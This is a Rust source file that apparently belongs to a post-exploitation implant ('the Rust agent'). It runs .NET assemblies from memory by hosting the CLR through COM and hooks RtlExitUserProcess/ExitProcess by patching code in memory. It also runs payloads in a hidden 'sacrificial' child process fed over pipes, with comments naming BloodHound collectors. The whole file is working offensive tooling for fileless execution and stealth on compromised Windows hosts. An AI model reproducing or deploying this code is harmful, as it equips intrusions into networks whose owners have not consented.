// In-memory .NET CLR hosting for the Rust agent.
//
// Same COM chain as dotnet.c: CLRCreateInstance → ICLRMetaHost::GetRuntime(v4)
// → ICLRRuntimeInfo::GetInterface(ICorRuntimeHost) → Start() →
// GetDefaultDomain() → QI(_AppDomain) → Load_3(SAFEARRAY) →
// get_EntryPoint() → Invoke_3() in a dedicated thread.
//
// ExitProcess is patched → ExitThread so Environment.Exit() doesn't kill
// the host process.

use std::mem::transmute_copy;
use std::ptr;
use std::sync::atomic::{AtomicBool, Ordering};
use windows_sys::Win32::{
    Foundation::{CloseHandle, INVALID_HANDLE_VALUE, HANDLE, MAX_PATH},
    System::{
        LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
        Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE},
        Threading::{CreateThread, ExitThread, WaitForSingleObject},
        Console::{GetStdHandle, SetStdHandle, STD_OUTPUT_HANDLE, STD_ERROR_HANDLE,
                  STD_INPUT_HANDLE},
    },
};

// ── Fork-and-run supporting types and extern fns ─────────────────────────────

#[repr(C)]
struct SecurityAttr { n_length: u32, lp_sd: *mut u8, b_inherit: i32 }
unsafe impl Send for SecurityAttr {}

#[repr(C)]
struct StartupInfoW {
    cb: u32, lp_reserved: *mut u16, lp_desktop: *mut u16, lp_title: *mut u16,
    dw_x: u32, dw_y: u32, dw_x_size: u32, dw_y_size: u32,
    dw_x_chars: u32, dw_y_chars: u32, dw_fill: u32, dw_flags: u32,
    w_show: u16, cb_reserved2: u16, lp_reserved2: *mut u8,
    h_std_input: isize, h_std_output: isize, h_std_error: isize,
}

#[repr(C)]
struct ProcessInfo { h_process: isize, h_thread: isize, dw_pid: u32, dw_tid: u32 }

const HANDLE_FLAG_INHERIT:   u32 = 0x00000001;
const CREATE_NO_WINDOW:      u32 = 0x08000000;
const STARTF_USESTDHANDLES:  u32 = 0x00000100;
const STARTF_USESHOWWINDOW:  u32 = 0x00000001;
const WAIT_TIMEOUT_VAL:      u32 = 0x00000102;
const STILL_ACTIVE_VAL:      u32 = 259;

extern "system" {
    fn GetModuleFileNameW(h_module: isize, lp_filename: *mut u16, n_size: u32) -> u32;
    fn CreatePipe(h_read: *mut isize, h_write: *mut isize,
                  lp_attr: *const core::ffi::c_void, n_size: u32) -> i32;
    fn SetHandleInformation(h: isize, dw_mask: u32, dw_flags: u32) -> i32;
    fn SetEnvironmentVariableA(lp_name: *const u8, lp_value: *const u8) -> i32;
    fn CreateProcessW(lp_app: *const u16, lp_cmd: *mut u16,
                      lp_pa: *const core::ffi::c_void, lp_ta: *const core::ffi::c_void,
                      b_inherit: i32, dw_flags: u32,
                      lp_env: *const core::ffi::c_void, lp_dir: *const u16,
                      lp_si: *const StartupInfoW, lp_pi: *mut ProcessInfo) -> i32;
    fn PeekNamedPipe(h: isize, buf: *mut u8, buf_sz: u32, bytes_read: *mut u32,
                     total_avail: *mut u32, msg_left: *mut u32) -> i32;
    fn TerminateProcess(h_process: isize, u_exit_code: u32) -> i32;
    fn GetExitCodeProcess(h_process: isize, lp_exit_code: *mut u32) -> i32;
    fn GetTickCount() -> u32;
}

// Raw file I/O and temp-file API — avoids windows-sys feature-path issues.
extern "system" {
    fn CreateFileW(lpFileName: *const u16, dwDesiredAccess: u32, dwShareMode: u32,
                   lpSecurityAttributes: *const core::ffi::c_void,
                   dwCreationDisposition: u32, dwFlagsAndAttributes: u32,
                   hTemplateFile: isize) -> isize;
    fn ReadFile(hFile: isize, lpBuffer: *mut u8, nNumberOfBytesToRead: u32,
                lpNumberOfBytesRead: *mut u32, lpOverlapped: *const core::ffi::c_void) -> i32;
    fn WriteFile(hFile: isize, lpBuffer: *const u8, nNumberOfBytesToWrite: u32,
                 lpNumberOfBytesWritten: *mut u32, lpOverlapped: *const core::ffi::c_void) -> i32;
    fn GetFileSize(hFile: isize, lpFileSizeHigh: *mut u32) -> u32;
    fn SetFilePointer(hFile: isize, lDistanceToMove: i32,
                      lpDistanceToMoveHigh: *mut i32, dwMoveMethod: u32) -> u32;
    fn FlushFileBuffers(hFile: isize) -> i32;
    fn GetTempPathW(nBufferLength: u32, lpBuffer: *mut u16) -> u32;
    fn GetTempFileNameW(lpPathName: *const u16, lpPrefixString: *const u16,
                        uUnique: u32, lpTempFileName: *mut u16) -> u32;
    fn DeleteFileW(lpFileName: *const u16) -> i32;
}

const GENERIC_READ:         u32 = 0x80000000;
const GENERIC_WRITE:        u32 = 0x40000000;
const FILE_SHARE_READ:      u32 = 0x00000001;
const CREATE_ALWAYS:        u32 = 2;
const FILE_ATTRIBUTE_NORMAL:u32 = 0x80;
const FILE_BEGIN:           u32 = 0;
const INVALID_FILE_SIZE:    u32 = 0xFFFFFFFF;

// ── GUID ─────────────────────────────────────────────────────────────────────

#[repr(C)]
struct Guid { d1: u32, d2: u16, d3: u16, d4: [u8; 8] }

const CLSID_CLR_META_HOST:    Guid = Guid { d1:0x9280188d, d2:0x0e8e, d3:0x4867, d4:[0xb3,0x0c,0x7f,0xa8,0x38,0x84,0xe8,0xde] };
const IID_ICLR_META_HOST:     Guid = Guid { d1:0xd332db9e, d2:0xb9b3, d3:0x4125, d4:[0x82,0x07,0xa1,0x48,0x84,0xf5,0x32,0x16] };
const IID_ICLR_RUNTIME_INFO:  Guid = Guid { d1:0xbd39d1d2, d2:0xba2f, d3:0x486a, d4:[0x89,0xb0,0xb4,0xb0,0xcb,0x46,0x68,0x91] };
const CLSID_COR_RUNTIME_HOST: Guid = Guid { d1:0xcb2f6723, d2:0xab3a, d3:0x11d2, d4:[0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e] };
const IID_ICOR_RUNTIME_HOST:  Guid = Guid { d1:0xcb2f6722, d2:0xab3a, d3:0x11d2, d4:[0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e] };
const IID_APP_DOMAIN:         Guid = Guid { d1:0x05f696dc, d2:0x2b29, d3:0x3663, d4:[0xad,0x8b,0xc4,0x38,0x9c,0xf2,0xa7,0x13] };

// ── VARIANT (x64 = 16 bytes) ──────────────────────────────────────────────────

#[repr(C)]
struct OleVar { vt: u16, r1: u16, r2: u16, r3: u16, data: u64 }

const VT_UI1:  u16 = 17;
const VT_BSTR: u16 = 8;
const VT_ARRAY: u16 = 0x2000;

// ── vtable accessor ───────────────────────────────────────────────────────────

unsafe fn vt<F: Copy>(obj: *mut u8, idx: usize) -> F {
    let vtbl = *(obj as *const *const usize);
    transmute_copy(&*vtbl.add(idx))
}

// ── SafeArray dynamic load ────────────────────────────────────────────────────

type FnSaCV = unsafe extern "system" fn(u16, i32, u32) -> *mut u8;
type FnSaAD = unsafe extern "system" fn(*mut u8, *mut *mut u8) -> i32;
type FnSaUA = unsafe extern "system" fn(*mut u8) -> i32;
type FnSaPE = unsafe extern "system" fn(*mut u8, *const i32, *const u8) -> i32;
type FnSaDe = unsafe extern "system" fn(*mut u8) -> i32;
type FnSAS  = unsafe extern "system" fn(*const u16) -> *mut u16;
type FnSFS  = unsafe extern "system" fn(*mut u16);

struct OleAut32 {
    sa_cv: FnSaCV, sa_ad: FnSaAD, sa_ua: FnSaUA,
    sa_pe: FnSaPE, sa_de: FnSaDe,
    sas: FnSAS, sfs: FnSFS,
}

unsafe fn gpa<F: Copy>(h: isize, name: &[u8]) -> Option<F> {
    let p = GetProcAddress(h, name.as_ptr())?;
    Some(transmute_copy(&p))
}

unsafe fn load_oleaut32() -> Option<OleAut32> {
    let h = LoadLibraryA(b"oleaut32.dll\0".as_ptr());
    if h == 0 { return None; }
    Some(OleAut32 {
        sa_cv: gpa(h, b"SafeArrayCreateVector\0")?,
        sa_ad: gpa(h, b"SafeArrayAccessData\0")?,
        sa_ua: gpa(h, b"SafeArrayUnaccessData\0")?,
        sa_pe: gpa(h, b"SafeArrayPutElement\0")?,
        sa_de: gpa(h, b"SafeArrayDestroy\0")?,
        sas:   gpa(h, b"SysAllocString\0")?,
        sfs:   gpa(h, b"SysFreeString\0")?,
    })
}

unsafe fn bytes_to_sa(oa: &OleAut32, data: &[u8]) -> *mut u8 {
    let sa = (oa.sa_cv)(VT_UI1, 0, data.len() as u32);
    if sa.is_null() { return ptr::null_mut(); }
    let mut pv: *mut u8 = ptr::null_mut();
    (oa.sa_ad)(sa, &mut pv);
    if !pv.is_null() { ptr::copy_nonoverlapping(data.as_ptr(), pv, data.len()); }
    (oa.sa_ua)(sa);
    sa
}

unsafe fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn shell_split(s: &str) -> Vec<String> {
    let mut parts: Vec<String> = Vec::new();
    let mut cur = String::new();
    let mut quote: char = '\0';
    for c in s.chars() {
        if quote == '\0' && (c == '"' || c == '\'') {
            quote = c;
        } else if quote != '\0' && c == quote {
            quote = '\0';
        } else if quote == '\0' && (c == ' ' || c == '\t') {
            if !cur.is_empty() {
                parts.push(std::mem::take(&mut cur));
            }
        } else {
            cur.push(c);
        }
    }
    if !cur.is_empty() { parts.push(cur); }
    parts
}

unsafe fn args_to_param_sa(oa: &OleAut32, args: &str) -> *mut u8 {
    let parts: Vec<String> = if args.is_empty() { vec![] } else { shell_split(args) };
    let inner = (oa.sa_cv)(VT_BSTR, 0, parts.len() as u32);
    if inner.is_null() { return ptr::null_mut(); }
    for (i, p) in parts.iter().enumerate() {
        let wide = to_wide(p);
        let bstr = (oa.sas)(wide.as_ptr());
        let idx = i as i32;
        (oa.sa_pe)(inner, &idx, bstr as *const u8);
        (oa.sfs)(bstr);
    }
    let outer = (oa.sa_cv)(12, 0, 1);  // VT_VARIANT = 12
    if outer.is_null() { (oa.sa_de)(inner); return ptr::null_mut(); }
    let elem = OleVar { vt: VT_ARRAY | VT_BSTR, r1:0, r2:0, r3:0, data: inner as u64 };
    let idx0 = 0i32;
    (oa.sa_pe)(outer, &idx0, &elem as *const OleVar as *const u8);
    (oa.sa_de)(inner);
    outer
}

// ── Stdout redirect ───────────────────────────────────────────────────────────

unsafe fn redirect_stdout() -> (HANDLE, Vec<u16>, HANDLE, HANDLE) {
    let orig_out = GetStdHandle(STD_OUTPUT_HANDLE);
    let orig_err = GetStdHandle(STD_ERROR_HANDLE);
    let mut tmp_dir = vec![0u16; MAX_PATH as usize];
    GetTempPathW(MAX_PATH, tmp_dir.as_mut_ptr());
    let mut tmp_path = vec![0u16; MAX_PATH as usize];
    let prefix = to_wide("clr");
    GetTempFileNameW(tmp_dir.as_ptr(), prefix.as_ptr(), 0, tmp_path.as_mut_ptr());
    let fh = CreateFileW(
        tmp_path.as_ptr(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ,
        ptr::null(), CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0,
    );
    if fh != INVALID_HANDLE_VALUE {
        SetStdHandle(STD_OUTPUT_HANDLE, fh);
        SetStdHandle(STD_ERROR_HANDLE, fh);
    }
    (fh, tmp_path, orig_out, orig_err)
}

unsafe fn read_temp_file(fh: HANDLE, tmp_path: &[u16]) -> String {
    let size = GetFileSize(fh, ptr::null_mut());
    if size == 0 || size == INVALID_FILE_SIZE {
        CloseHandle(fh);
        DeleteFileW(tmp_path.as_ptr());
        return "(no output)".into();
    }
    let mut buf = vec![0u8; size as usize];
    SetFilePointer(fh, 0, ptr::null_mut(), FILE_BEGIN);
    let mut rd = 0u32;
    ReadFile(fh, buf.as_mut_ptr(), size, &mut rd, ptr::null());
    buf.truncate(rd as usize);
    CloseHandle(fh);
    DeleteFileW(tmp_path.as_ptr());
    String::from_utf8_lossy(&buf).into_owned()
}

// ── ExitProcess hook → ExitThread ────────────────────────────────────────────

static EP_HOOKED: AtomicBool = AtomicBool::new(false);
static mut EP_ORIG: [u8; 12] = [0u8; 12];
static mut EP_ADDR: *mut u8 = ptr::null_mut();

unsafe extern "system" fn ep_stub(code: u32) { ExitThread(code); }

unsafe fn install_exit_hook() {
    if EP_HOOKED.swap(true, Ordering::SeqCst) { return; }
    // Patch ntdll!RtlExitUserProcess — the CLR calls this directly
    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
    let addr = if ntdll != 0 {
        match GetProcAddress(ntdll, b"RtlExitUserProcess\0".as_ptr()) {
            Some(f) => f as *mut u8,
            None => {
                let k32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
                if k32 == 0 { return; }
                match GetProcAddress(k32, b"ExitProcess\0".as_ptr()) {
                    Some(f) => f as *mut u8, None => return,
                }
            }
        }
    } else {
        let k32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
        if k32 == 0 { return; }
        match GetProcAddress(k32, b"ExitProcess\0".as_ptr()) {
            Some(f) => f as *mut u8, None => return,
        }
    };
    EP_ADDR = addr;
    let stub = ep_stub as usize as u64;
    let mut jmp = [0u8; 12];
    jmp[0] = 0x48; jmp[1] = 0xB8;
    jmp[2..10].copy_from_slice(&stub.to_le_bytes());
    jmp[10] = 0xFF; jmp[11] = 0xE0;
    let mut old = 0u32;
    VirtualProtect(EP_ADDR as _, 12, PAGE_EXECUTE_READWRITE, &mut old);
    ptr::copy_nonoverlapping(EP_ADDR, EP_ORIG.as_mut_ptr(), 12);
    ptr::copy_nonoverlapping(jmp.as_ptr(), EP_ADDR, 12);
    VirtualProtect(EP_ADDR as _, 12, old, &mut old);
}

unsafe fn remove_exit_hook() {
    if !EP_HOOKED.swap(false, Ordering::SeqCst) { return; }
    if EP_ADDR.is_null() { return; }
    let mut old = 0u32;
    VirtualProtect(EP_ADDR as _, 12, PAGE_EXECUTE_READWRITE, &mut old);
    ptr::copy_nonoverlapping(EP_ORIG.as_ptr(), EP_ADDR, 12);
    VirtualProtect(EP_ADDR as _, 12, old, &mut old);
}

// ── Invoke_3 thread ───────────────────────────────────────────────────────────

struct InvokeArgs { ep: *mut u8, sa_params: *mut u8, hr: i32 }
unsafe impl Send for InvokeArgs {}

unsafe extern "system" fn invoke_thread(param: *mut core::ffi::c_void) -> u32 {
    let w = &mut *(param as *mut InvokeArgs);
    type FnInv = unsafe extern "system" fn(*mut u8, *const OleVar, *mut u8, *mut OleVar) -> i32;
    let fn_ptr: FnInv = vt(w.ep, 37);
    let obj_v = OleVar { vt:0, r1:0, r2:0, r3:0, data:0 };
    let mut ret_v = OleVar { vt:0, r1:0, r2:0, r3:0, data:0 };
    w.hr = fn_ptr(w.ep, &obj_v, w.sa_params, &mut ret_v);
    0
}

// ── Public entry ──────────────────────────────────────────────────────────────

pub fn exec_dotnet(asm_bytes: &[u8], args: &str, child_mode: bool) -> String {
    if asm_bytes.len() < 2 { return "[!] dotnet_exec: empty payload".into(); }
    unsafe {
        let Some(oa) = load_oleaut32() else {
            return "[!] dotnet_exec: oleaut32.dll load failed".into();
        };
        let hms = LoadLibraryA(b"mscoree.dll\0".as_ptr());
        if hms == 0 { return "[!] dotnet_exec: mscoree.dll not found".into(); }
        type FnCI = unsafe extern "system" fn(*const Guid, *const Guid, *mut *mut u8) -> i32;
        let clr_ci: FnCI = match gpa(hms, b"CLRCreateInstance\0") {
            Some(f) => f, None => return "[!] dotnet_exec: CLRCreateInstance not found".into(),
        };

        // ICLRMetaHost
        let mut p_mh: *mut u8 = ptr::null_mut();
        if clr_ci(&CLSID_CLR_META_HOST, &IID_ICLR_META_HOST, &mut p_mh) < 0 || p_mh.is_null() {
            return "[!] dotnet_exec: CLRCreateInstance failed".into();
        }

        // GetRuntime(v4) vtbl[3]
        type FnGR = unsafe extern "system" fn(*mut u8, *const u16, *const Guid, *mut *mut u8) -> i32;
        let ver = to_wide("v4.0.30319");
        let mut p_rti: *mut u8 = ptr::null_mut();
        let gr: FnGR = vt(p_mh, 3);
        if gr(p_mh, ver.as_ptr(), &IID_ICLR_RUNTIME_INFO, &mut p_rti) < 0 || p_rti.is_null() {
            return "[!] dotnet_exec: GetRuntime failed".into();
        }

        // GetInterface → ICorRuntimeHost  vtbl[9]
        type FnGI = unsafe extern "system" fn(*mut u8, *const Guid, *const Guid, *mut *mut u8) -> i32;
        let mut p_ch: *mut u8 = ptr::null_mut();
        let gi: FnGI = vt(p_rti, 9);
        if gi(p_rti, &CLSID_COR_RUNTIME_HOST, &IID_ICOR_RUNTIME_HOST, &mut p_ch) < 0 || p_ch.is_null() {
            return "[!] dotnet_exec: GetInterface failed".into();
        }

        // Start()  vtbl[10]
        type FnV = unsafe extern "system" fn(*mut u8) -> i32;
        let start: FnV = vt(p_ch, 10);
        let hr_start = start(p_ch);
        if hr_start < 0 && hr_start != 1 {
            return "[!] dotnet_exec: Start failed".into();
        }

        // GetDefaultDomain  vtbl[13]
        type FnGDD = unsafe extern "system" fn(*mut u8, *mut *mut u8) -> i32;
        let mut p_dom: *mut u8 = ptr::null_mut();
        let gdd: FnGDD = vt(p_ch, 13);
        if gdd(p_ch, &mut p_dom) < 0 || p_dom.is_null() {
            return "[!] dotnet_exec: GetDefaultDomain failed".into();
        }

        // QI → _AppDomain  IUnknown vtbl[0]
        type FnQI = unsafe extern "system" fn(*mut u8, *const Guid, *mut *mut u8) -> i32;
        let mut p_ad: *mut u8 = ptr::null_mut();
        let qi: FnQI = vt(p_dom, 0);
        if qi(p_dom, &IID_APP_DOMAIN, &mut p_ad) < 0 || p_ad.is_null() {
            return "[!] dotnet_exec: QI _AppDomain failed".into();
        }

        let sa_asm = bytes_to_sa(&oa, asm_bytes);
        if sa_asm.is_null() { return "[!] dotnet_exec: bytes_to_sa failed".into(); }

        // Load_3  vtbl[44] or [45]
        type FnL3 = unsafe extern "system" fn(*mut u8, *mut u8, *mut *mut u8) -> i32;
        let mut p_asm: *mut u8 = ptr::null_mut();
        let load3_44: FnL3 = vt(p_ad, 44);
        let mut hr = load3_44(p_ad, sa_asm, &mut p_asm);
        if hr < 0 || p_asm.is_null() {
            p_asm = ptr::null_mut();
            let load3_45: FnL3 = vt(p_ad, 45);
            hr = load3_45(p_ad, sa_asm, &mut p_asm);
        }
        if hr < 0 || p_asm.is_null() {
            return format!("[!] dotnet_exec: Load_3 failed hr=0x{:08X}", hr as u32);
        }

        // get_EntryPoint  vtbl[16]
        type FnGEP = unsafe extern "system" fn(*mut u8, *mut *mut u8) -> i32;
        let mut p_ep: *mut u8 = ptr::null_mut();
        let gep: FnGEP = vt(p_asm, 16);
        if gep(p_asm, &mut p_ep) < 0 || p_ep.is_null() {
            return "[!] dotnet_exec: get_EntryPoint failed".into();
        }

        let sa_params = args_to_param_sa(&oa, args);

        // Redirect stdout: temp file (normal) or use inherited pipe (child).
        let (fh_tmp, tmp_path, orig_out, orig_err) = if child_mode {
            let fh = GetStdHandle(STD_OUTPUT_HANDLE);
            SetStdHandle(STD_ERROR_HANDLE, fh);
            (fh, Vec::<u16>::new(), 0isize, 0isize)
        } else {
            redirect_stdout()
        };

        let mut work = InvokeArgs { ep: p_ep, sa_params: sa_params, hr: 0 };
        if !child_mode { install_exit_hook(); }
        let ht = CreateThread(ptr::null(), 0, Some(invoke_thread),
            &mut work as *mut _ as _, 0, ptr::null_mut());
        if ht != 0 {
            // Keep the CLR invocation alive for long-running directory-wide
            // collectors; the parent process owns the actual bounded timeout.
            WaitForSingleObject(ht, 900_000);
            CloseHandle(ht);
        }
        if !child_mode { remove_exit_hook(); }

        if child_mode {
            FlushFileBuffers(fh_tmp);
            std::process::exit(0);
        }

        SetStdHandle(STD_OUTPUT_HANDLE, orig_out);
        SetStdHandle(STD_ERROR_HANDLE, orig_err);
        if !sa_params.is_null() { (oa.sa_de)(sa_params); }

        if fh_tmp == INVALID_HANDLE_VALUE { return "(no output captured)".into(); }
        FlushFileBuffers(fh_tmp);
        read_temp_file(fh_tmp, &tmp_path)
    }
}

// ── Fork-and-run: spawn a sacrificial child process to host the CLR ───────────

pub fn fork_run_assembly(asm_bytes: &[u8], args: &str, timeout_sec: u64) -> String {
    unsafe {
        let mut exe = [0u16; MAX_PATH as usize + 1];
        if GetModuleFileNameW(0, exe.as_mut_ptr(), MAX_PATH) == 0 {
            return "[!] fork_run: GetModuleFileNameW failed".into();
        }

        let sa = SecurityAttr {
            n_length: std::mem::size_of::<SecurityAttr>() as u32,
            lp_sd: ptr::null_mut(), b_inherit: 1,
        };
        let (mut asm_rd, mut asm_wr) = (0isize, 0isize);
        let sa_ptr = &sa as *const SecurityAttr as *const core::ffi::c_void;
        if CreatePipe(&mut asm_rd, &mut asm_wr, sa_ptr, 0) == 0 {
            return "[!] fork_run: CreatePipe stdin failed".into();
        }
        SetHandleInformation(asm_wr, HANDLE_FLAG_INHERIT, 0);

        let (mut out_rd, mut out_wr) = (0isize, 0isize);
        if CreatePipe(&mut out_rd, &mut out_wr, sa_ptr, 0) == 0 {
            CloseHandle(asm_rd); CloseHandle(asm_wr);
            return "[!] fork_run: CreatePipe stdout failed".into();
        }
        SetHandleInformation(out_rd, HANDLE_FLAG_INHERIT, 0);

        SetEnvironmentVariableA(b"__ENDGAME_CLR_CHILD\0".as_ptr(), b"1\0".as_ptr());

        let si = StartupInfoW {
            cb: std::mem::size_of::<StartupInfoW>() as u32,
            lp_reserved: ptr::null_mut(), lp_desktop: ptr::null_mut(),
            lp_title: ptr::null_mut(), dw_x: 0, dw_y: 0, dw_x_size: 0, dw_y_size: 0,
            dw_x_chars: 0, dw_y_chars: 0, dw_fill: 0,
            dw_flags: STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW,
            w_show: 0, cb_reserved2: 0, lp_reserved2: ptr::null_mut(),
            h_std_input: asm_rd, h_std_output: out_wr, h_std_error: out_wr,
        };
        let mut pi = ProcessInfo { h_process: 0, h_thread: 0, dw_pid: 0, dw_tid: 0 };
        let ok = CreateProcessW(exe.as_ptr(), ptr::null_mut(),
                                ptr::null(), ptr::null(),
                                1, CREATE_NO_WINDOW,
                                ptr::null(), ptr::null(), &si, &mut pi);
        SetEnvironmentVariableA(b"__ENDGAME_CLR_CHILD\0".as_ptr(), ptr::null());
        CloseHandle(asm_rd);
        CloseHandle(out_wr);

        if ok == 0 {
            CloseHandle(asm_wr); CloseHandle(out_rd);
            return "[!] fork_run: CreateProcessW failed".into();
        }

        // Writer thread: send [4LE args_len][args][4LE asm_len][asm] to child stdin.
        let asm_clone = asm_bytes.to_vec();
        let args_clone = args.to_string();
        let _ = std::thread::spawn(move || unsafe {
            let mut write_all = |data: &[u8]| {
                let mut off = 0usize;
                while off < data.len() {
                    let mut wr = 0u32;
                    if WriteFile(asm_wr, data.as_ptr().add(off), (data.len() - off) as u32,
                                 &mut wr, ptr::null()) == 0 || wr == 0 { break; }
                    off += wr as usize;
                }
            };
            let ab = args_clone.as_bytes();
            write_all(&(ab.len() as u32).to_le_bytes());
            if !ab.is_empty() { write_all(ab); }
            write_all(&(asm_clone.len() as u32).to_le_bytes());
            if !asm_clone.is_empty() { write_all(&asm_clone); }
            CloseHandle(asm_wr);
        });

        // Read output from child with a 60s default. BloodHound can opt into
        // a bounded longer window through timeout_sec.
        let mut output = Vec::<u8>::new();
        let start_tick = GetTickCount();
        let timeout_ms: u32 = if (60..=1800).contains(&timeout_sec) {
            (timeout_sec * 1000) as u32
        } else {
            60_000
        };
        let mut buf = [0u8; 8192];

        loop {
            if GetTickCount().wrapping_sub(start_tick) >= timeout_ms {
                TerminateProcess(pi.h_process, 1);
                let timeout_note = format!("\n[!] fork-and-run timeout ({}s)", timeout_ms / 1000);
                if output.is_empty() {
                    output.extend_from_slice(timeout_note.as_bytes());
                    CloseHandle(out_rd);
                    WaitForSingleObject(pi.h_process, 5000);
                    CloseHandle(pi.h_process); CloseHandle(pi.h_thread);
                    return String::from_utf8_lossy(&output).into_owned();
                }
                output.extend_from_slice(timeout_note.as_bytes());
                break;
            }
            let mut avail = 0u32;
            if PeekNamedPipe(out_rd, ptr::null_mut(), 0,
                             ptr::null_mut(), &mut avail, ptr::null_mut()) == 0 { break; }
            if avail > 0 {
                let mut nr = 0u32;
                ReadFile(out_rd, buf.as_mut_ptr(), avail.min(buf.len() as u32), &mut nr, ptr::null());
                if nr > 0 { output.extend_from_slice(&buf[..nr as usize]); }
            } else {
                let r = WaitForSingleObject(pi.h_process, 50);
                if r != WAIT_TIMEOUT_VAL {
                    loop {
                        avail = 0;
                        if PeekNamedPipe(out_rd, ptr::null_mut(), 0,
                                         ptr::null_mut(), &mut avail, ptr::null_mut()) == 0
                            || avail == 0 { break; }
                        let mut nr = 0u32;
                        ReadFile(out_rd, buf.as_mut_ptr(), avail.min(buf.len() as u32), &mut nr, ptr::null());
                        if nr == 0 { break; }
                        output.extend_from_slice(&buf[..nr as usize]);
                    }
                    break;
                }
            }
        }

        CloseHandle(out_rd);
        WaitForSingleObject(pi.h_process, 5000);
        let mut exit_code: u32 = 0;
        GetExitCodeProcess(pi.h_process, &mut exit_code);
        CloseHandle(pi.h_process); CloseHandle(pi.h_thread);

        if exit_code != 0 && exit_code != STILL_ACTIVE_VAL {
            let suffix = if exit_code == 0xC0000005u32 {
                " (ACCESS_VIOLATION — unsafe/P-Invoke code in assembly)"
            } else { "" };
            let marker = format!("\n[!] fork-and-run child exited with code {} (0x{:08X}){}",
                exit_code, exit_code, suffix);
            output.extend_from_slice(marker.as_bytes());
        }

        if output.is_empty() { return "(no output from child)".into(); }
        String::from_utf8_lossy(&output).into_owned()
    }
}

// ── Child entry: read protocol from stdin, run CLR via pipe, exit ─────────────

pub fn clr_child_run() {
    unsafe {
        let h_in = GetStdHandle(STD_INPUT_HANDLE);

        let mut read_exact = |buf: &mut [u8]| -> bool {
            let mut off = 0usize;
            while off < buf.len() {
                let mut rd = 0u32;
                if ReadFile(h_in, buf.as_mut_ptr().add(off), (buf.len() - off) as u32,
                            &mut rd, ptr::null()) == 0 || rd == 0 { return false; }
                off += rd as usize;
            }
            true
        };

        let mut hdr = [0u8; 4];
        if !read_exact(&mut hdr) { std::process::exit(1); }
        let args_len = u32::from_le_bytes(hdr) as usize;

        let mut args_bytes = vec![0u8; args_len];
        if args_len > 0 && !read_exact(&mut args_bytes) { std::process::exit(1); }
        let args_str = String::from_utf8_lossy(&args_bytes).into_owned();

        if !read_exact(&mut hdr) { std::process::exit(1); }
        let asm_len = u32::from_le_bytes(hdr) as usize;

        let mut asm_buf = vec![0u8; asm_len];
        if asm_len > 0 && !read_exact(&mut asm_buf) { std::process::exit(1); }

        exec_dotnet(&asm_buf, &args_str, true); // calls std::process::exit(0) internally
        std::process::exit(0);
    }
}
